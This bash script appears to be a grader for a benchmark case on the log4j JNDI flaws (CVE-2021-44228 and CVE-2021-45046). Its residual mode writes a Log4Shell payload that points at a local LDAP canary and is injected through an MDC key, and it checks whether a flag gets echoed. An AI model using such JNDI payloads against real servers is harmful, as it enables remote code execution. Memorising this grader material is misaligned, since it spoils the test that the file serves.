#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0077 (log4j JNDI:
# CVE-2021-44228 message lookup -> CVE-2021-45046 Context/MDC lookup).
#
# Flag lives only in the internal LDAP canary (PCB_FLAG at compose-up).
# Judge uses the submitted RUN_FLAG so wrong/stale overrides fail even though
# the canary still echoes the real token.
# Exit: 0=effect (flag echoed) 10=no effect 20=env failure 30=arg error
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json"
else
  # CVE-2021-45046 residual (inline, no heldout): ThreadContext/MDC value is
  # interpolated by PatternLayout $${ctx:pcbctx} on 2.15.0; 127.0.0.1 is in
  # the default JNDI allowed-hosts, so the lookup still fires.
  "$PY" - "$WORK_DIR/cand.json" <<'PY'
import json, secrets, sys
token = "pcbtok" + secrets.token_hex(8)
open(sys.argv[1], "w").write(json.dumps({
    "id": "cve-2021-45046-ctx-mdc-lookup",
    "vector": "ctx",
    "token": token,
    "payload": "${jndi:ldap://127.0.0.1:1389/" + token + "}",
    "mdc_key": "pcbctx",
}))
PY
fi

RUNNING=""
for _ in $(seq 1 30); do
  if docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
       --profile "$VERSION" exec -T "$VERSION" \
       python3 -c "import socket; s=socket.create_connection(('127.0.0.1',1389),2); s.close()" >/dev/null 2>&1; then
    RUNNING=1
    break
  fi
  sleep 2
done
if [[ -z "$RUNNING" ]]; then echo "verify: $VERSION LDAP canary not running" >&2; exit 20; fi

export PCB_X="$RUN_FLAG"
export PCB_FLAG="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == sys.argv[2] else 10)" "$OUT" "$RUN_FLAG"
